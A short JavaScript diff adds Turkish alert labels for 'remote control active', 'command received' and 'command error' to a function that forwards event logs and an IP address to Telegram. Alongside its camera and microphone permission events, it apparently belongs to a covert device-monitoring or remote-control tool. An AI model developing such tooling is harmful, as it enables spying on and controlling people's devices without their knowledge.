@@ -84,7 +84,10 @@ function formatTelegramMessage(logData, ip) {
         'camera_permission_granted': '📷 KAMERA İZNİ VERİLDİ',
         'camera_permission_denied': '🚫 KAMERA İZNİ REDDEDİLDİ',
         'microphone_permission_granted': '🎤 MİKROFON İZNİ VERİLDİ',
-        'microphone_permission_denied': '🚫 MİKROFON İZNİ REDDEDİLDİ'
+        'microphone_permission_denied': '🚫 MİKROFON İZNİ REDDEDİLDİ',
+        'remote_control_started': '🎮 CİHAZ BAĞLANDI - UZAKTAN KONTROL AKTİF',
+        'command_received': '📡 KOMUT ALINDI',
+        'command_error': '⚠️ KOMUT HATASI'
     };
 
     const title = eventIcons[event_type] || '🔔 YENİ OLAY';
